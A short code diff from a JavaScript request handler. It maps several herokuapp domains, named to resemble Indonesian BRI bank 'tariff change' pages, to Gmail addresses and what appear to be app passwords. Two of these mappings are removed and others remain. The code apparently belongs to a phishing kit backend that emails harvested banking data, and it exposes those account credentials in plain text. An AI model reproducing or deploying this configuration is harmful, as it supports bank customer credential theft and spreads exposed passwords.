@@ -13,22 +13,10 @@ export default function handler(req, res) {
        pass = 'edzwmbnxxhpjsnbe'
     }else
     
-     if (url == 'pilihan-tarifbri-br.herokuapp.com'){
-
-       email = 'mamtkampang@gmail.com'
-       pass = 'bubifpbqryxohtuw'
-    }else
-    
     if (url == 'pilihan-tarifbri.herokuapp.com'){
 
        email = 'lajumacet78@gmail.com'
        pass = 'krfomliejdqgwiqx'
-    }else
-    
-    if (url == 'pilihan-tarif-bru.herokuapp.com'){
-
-       email = 'rewang788@gmail.com'
-       pass = 'lvvsrbjjsisutmpg'
     }else
     
     if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
